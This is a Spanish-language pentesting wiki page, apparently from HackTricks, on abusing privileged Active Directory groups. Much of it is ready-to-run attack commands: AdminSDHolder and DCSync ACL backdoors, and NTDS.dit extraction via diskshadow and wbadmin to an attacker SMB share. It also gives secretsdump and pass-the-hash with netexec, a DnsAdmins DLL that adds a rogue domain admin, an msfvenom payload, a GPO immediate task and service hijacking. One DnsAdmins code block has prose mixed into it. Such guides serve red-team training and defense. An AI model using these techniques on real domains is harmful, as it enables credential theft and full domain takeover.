# Grupos Privilegiados

{{#include ../../banners/hacktricks-training.md}}

## Grupos bien conocidos con privilegios de administración

- **Administradores**
- **Administradores de Dominio**
- **Administradores de Empresa**

## Operadores de cuentas

Este grupo tiene facultades para crear cuentas y grupos que no son administradores en el dominio. Además, permite el inicio de sesión local en el Controlador de Dominio (DC).

Para identificar a los miembros de este grupo, se ejecuta el siguiente comando:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Se permite agregar nuevos usuarios, así como el inicio de sesión local en el DC.

## Grupo AdminSDHolder

La Lista de control de acceso (ACL) del grupo **AdminSDHolder** es crucial ya que establece permisos para todos los "grupos protegidos" dentro de Active Directory, incluidos los grupos de alto privilegio. Este mecanismo asegura la seguridad de estos grupos evitando modificaciones no autorizadas.

Un atacante podría explotar esto modificando la ACL del grupo **AdminSDHolder**, concediendo permisos totales a un usuario estándar. Esto daría efectivamente a ese usuario control total sobre todos los grupos protegidos. Si los permisos de ese usuario se modifican o eliminan, se restablecerían automáticamente en el plazo de una hora debido al diseño del sistema.

La documentación reciente de Windows Server todavía trata a varios grupos de operadores integrados como objetos **protegidos** (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins`, etc.). El proceso **SDProp** se ejecuta en el **PDC Emulator** cada 60 minutos por defecto, marca `adminCount=1` y deshabilita la herencia en los objetos protegidos. Esto es útil tanto para persistencia como para la búsqueda de usuarios privilegiados obsoletos que fueron eliminados de un grupo protegido pero que aún conservan la ACL sin herencia.

Los comandos para revisar los miembros y modificar permisos incluyen:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
Select-Object distinguishedName
```
Un script está disponible para acelerar el proceso de restauración: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Para más detalles, visite [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## AD Recycle Bin

La pertenencia a este grupo permite la lectura de objetos de Active Directory eliminados, lo que puede revelar información sensible:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
Esto es útil para **recuperar rutas de privilegios anteriores**. Los objetos eliminados aún pueden exponer `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, SPNs antiguos, o el DN de un grupo privilegiado eliminado que luego puede ser restaurado por otro operador.
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
-Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```
### Acceso al controlador de dominio

El acceso a los archivos en el controlador de dominio (DC) está restringido a menos que el usuario forme parte del grupo `Server Operators`, lo que modifica el nivel de acceso.

### Escalada de privilegios

Usando `PsService` o `sc` de Sysinternals, se pueden inspeccionar y modificar los permisos de los servicios. El grupo `Server Operators`, por ejemplo, tiene control total sobre ciertos servicios, permitiendo la ejecución de comandos arbitrarios y la escalada de privilegios:
```cmd
C:\> .\PsService.exe security AppReadiness
```
Este comando revela que `Server Operators` tienen acceso completo, lo que permite manipular servicios para obtener privilegios elevados.

## Backup Operators

La pertenencia al grupo `Backup Operators` proporciona acceso al sistema de archivos de `DC01` debido a los privilegios `SeBackup` y `SeRestore`. Estos privilegios permiten recorrer carpetas, listar y copiar archivos, incluso sin permisos explícitos, usando la bandera `FILE_FLAG_BACKUP_SEMANTICS`. Es necesario utilizar scripts específicos para este proceso.

Para listar los miembros del grupo, ejecute:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Ataque local

Para aprovechar estos privilegios localmente, se emplean los siguientes pasos:

1. Importar las librerías necesarias:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Habilitar y verificar `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Acceder y copiar archivos de directorios restringidos, por ejemplo:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD Attack

El acceso directo al sistema de archivos del Controlador de Dominio permite el robo de la base de datos `NTDS.dit`, que contiene todos los hashes NTLM de los usuarios y equipos del dominio.

#### Uso de diskshadow.exe

1. Crea una shadow copy del disco `C`:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Copiar `NTDS.dit` desde la copia de sombra:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Como alternativa, usa `robocopy` para copiar archivos:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Extraer `SYSTEM` y `SAM` para recuperar hashes:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Recuperar todos los hashes de `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. Post-extracción: Pass-the-Hash a DA
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### Uso de wbadmin.exe

1. Configura un sistema de archivos NTFS para el servidor SMB en la máquina atacante y almacena en caché las credenciales SMB en la máquina objetivo.
2. Usa `wbadmin.exe` para respaldos del sistema y extracción de `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

For a practical demonstration, see [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Los miembros del grupo **DnsAdmins** pueden explotar sus privilegios para cargar una DLL arbitraria con privilegios SYSTEM en un servidor DNS, a menudo alojado en controladores de dominio. Esta capacidad permite un potencial de explotación significativo.

Para listar los miembros del grupo DnsAdmins, usa:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Execute arbitrary DLL (CVE‑2021‑40469)

> [!NOTE]
> Esta vulnerabilidad permite la ejecución de código arbitrario con privilegios SYSTEM en el servicio DNS (usualmente dentro de los DCs). Este problema fue corregido en 2021.

Members pueden hacer que el servidor DNS cargue una DLL arbitraria (ya sea localmente o desde un recurso compartido remoto) usando comandos como:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Reiniciar el servicio DNS (lo que puede requerir permisos adicionales) es necesario para que se cargue la DLL:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Para más detalles sobre este vector de ataque, consulte ired.team.

#### Mimilib.dll

También es factible usar mimilib.dll para la ejecución de comandos, modificándola para ejecutar comandos específicos o reverse shells. [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) para más información.

### WPAD Record for MitM

Los miembros de DnsAdmins pueden manipular registros DNS para realizar ataques Man-in-the-Middle (MitM) creando un registro WPAD tras deshabilitar la global query block list. Herramientas como Responder o Inveigh pueden usarse para spoofing y captura de tráfico de red.

### Event Log Readers
Los miembros pueden acceder a los registros de eventos, potencialmente encontrando información sensible como contraseñas en texto plano o detalles de ejecución de comandos:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

Este grupo puede modificar las DACLs en el objeto de dominio, potencialmente otorgando privilegios DCSync. Las técnicas para la escalada de privilegios que explotan este grupo están detalladas en Exchange-AD-Privesc GitHub repo.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
Si puedes actuar como miembro de este grupo, el abuso clásico es conceder a un principal controlado por un atacante los derechos de replicación necesarios para [DCSync](dcsync.md):
```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```
Históricamente, **PrivExchange** encadenó el acceso a buzones, forzó la autenticación de Exchange y LDAP relay para llegar a esta misma primitiva. Incluso donde esa ruta de relay está mitigada, la membresía directa en `Exchange Windows Permissions` o el control de un Exchange server sigue siendo una ruta de alto valor para obtener derechos de replicación de dominio.

## Hyper-V Administrators

Hyper-V Administrators tienen acceso completo a Hyper-V, lo cual puede explotarse para obtener control sobre Domain Controllers virtualizados. Esto incluye clonar DCs en vivo y extraer hashes NTLM del archivo NTDS.dit.

### Exploitation Example

El abuso práctico suele ser **acceso offline a discos/checkpoints de DC** en lugar de viejos trucos de LPE a nivel de host. Con acceso al host de Hyper-V, un operador puede crear un checkpoint o exportar un Domain Controller virtualizado, montar el VHDX y extraer `NTDS.dit`, `SYSTEM` y otros secretos sin tocar LSASS dentro del guest:
```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```
A partir de ahí, reutiliza el flujo de trabajo de `Backup Operators` para copiar `Windows\NTDS\ntds.dit` y las colmenas del registro sin conexión.

## Group Policy Creators Owners

Este grupo permite a sus miembros crear Group Policies en el dominio. Sin embargo, sus miembros no pueden aplicar Group Policies a usuarios o grupos ni editar GPOs existentes.

La matiz importante es que el **creador se convierte en propietario del nuevo GPO** y normalmente obtiene suficientes permisos para editarlo después. Eso significa que este grupo resulta interesante cuando puedes:

- crear un GPO malicioso y convencer a un admin de vincularlo a una OU/dominio objetivo
- editar un GPO que creaste y que ya está vinculado en algún lugar útil
- abusar de otro derecho delegado que te permite vincular GPOs, mientras que este grupo te da la capacidad de editarlos

El abuso práctico suele implicar añadir una **Immediate Task**, un **startup script**, la **local admin membership**, o un cambio en **user rights assignment** mediante archivos de política respaldados por SYSVOL.
```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```
Si editas la GPO manualmente a través de `SYSVOL`, recuerda que el cambio no es suficiente por sí mismo: `versionNumber`, `GPT.ini` y, a veces, `gPCMachineExtensionNames` también deben actualizarse o los clientes ignorarán la actualización de la política.

## Administración de la organización

En entornos donde se despliega **Microsoft Exchange**, un grupo especial conocido como **Administración de la organización** posee capacidades significativas. Este grupo tiene el privilegio de **acceder a los buzones de todos los usuarios del dominio** y mantiene **control total sobre la Unidad Organizativa (OU) 'Microsoft Exchange Security Groups'**. Este control incluye al grupo **`Exchange Windows Permissions`**, que puede ser explotado para la escalada de privilegios.

### Explotación de privilegios y comandos

#### Operadores de impresión

Los miembros del grupo **Operadores de impresión** poseen varios privilegios, incluido **`SeLoadDriverPrivilege`**, que les permite **iniciar sesión localmente en un controlador de dominio**, apagarlo y administrar impresoras. Para explotar estos privilegios, especialmente si **`SeLoadDriverPrivilege`** no es visible en un contexto sin elevación, es necesario eludir el Control de cuentas de usuario (UAC).

Para listar los miembros de este grupo, se utiliza el siguiente comando de PowerShell:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
En los Domain Controllers este grupo es peligroso porque la política predeterminada de Domain Controller otorga **`SeLoadDriverPrivilege`** a `Print Operators`. Si obtienes un token elevado de un miembro de este grupo, puedes habilitar el privilegio y cargar un driver firmado pero vulnerable para escalar al kernel/SYSTEM. Para detalles sobre el manejo de tokens, consulta [Access Tokens](../windows-local-privilege-escalation/access-tokens.md).

#### Usuarios de Escritorio Remoto

Los miembros de este grupo tienen acceso a PCs mediante el Protocolo de Escritorio Remoto (RDP). Para enumerar a estos miembros, hay comandos de PowerShell disponibles:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Más información sobre la explotación de RDP puede encontrarse en recursos dedicados de pentesting.

#### Usuarios de administración remota

Los miembros pueden acceder a equipos mediante **Windows Remote Management (WinRM)**. La enumeración de estos miembros se realiza mediante:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Para técnicas de explotación relacionadas con **WinRM**, se debe consultar la documentación específica.

#### Operadores de servidores

Este grupo tiene permisos para realizar varias configuraciones en los Controladores de dominio, incluyendo privilegios de copia de seguridad y restauración, cambiar la hora del sistema y apagar el sistema. Para enumerar los miembros, el comando proporcionado es:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
En los controladores de dominio, `Server Operators` comúnmente heredan suficientes derechos para **reconfigurar o iniciar/detener servicios** y también reciben `SeBackupPrivilege`/`SeRestorePrivilege` mediante la política predeterminada del DC. En la práctica, esto los convierte en un puente entre **service-control abuse** y **NTDS extraction**:
```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```
Si la ACL del servicio le da a este grupo permisos para cambiar/iniciar, apunta el servicio a un comando arbitrario, inícialo como `LocalSystem` y luego restaura el `binPath` original. Si el control de servicios está restringido, recurre a las técnicas para `Backup Operators` mencionadas arriba para copiar `NTDS.dit`.

## Referencias <a href="#references" id="references"></a>

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
- [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [https://labs.withsecure.com/tools/sharpgpoabuse](https://labs.withsecure.com/tools/sharpgpoabuse)


{{#include ../../banners/hacktricks-training.md}}
